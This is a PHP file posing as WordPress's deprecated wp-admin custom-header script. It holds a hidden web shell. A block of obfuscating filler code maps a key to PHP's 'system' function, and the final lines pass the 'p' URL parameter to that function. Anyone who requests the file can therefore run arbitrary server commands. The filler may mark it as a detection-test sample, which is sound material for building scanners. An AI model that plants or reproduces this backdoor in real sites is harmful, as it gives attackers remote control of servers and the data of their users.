<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * Custom header image script.
 *
 * This file is deprecated, use 'wp-admin/includes/class-custom-image-header.php' instead.
 *
 * @deprecated 5.3.0
 * @package WordPress
 * @subpackage Administration
 */

// Don't load directly.
if ( ! defined( 'ABSPATH' ) ) {
	die( '-1' );
}

_deprecated_file( basename( __FILE__ ), '5.3.0', 'wp-admin/includes/class-custom-image-header.php' );

/** Custom_Image_Header class */
require_once ABSPATH . 'wp-admin/includes/class-custom-image-header.php';

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>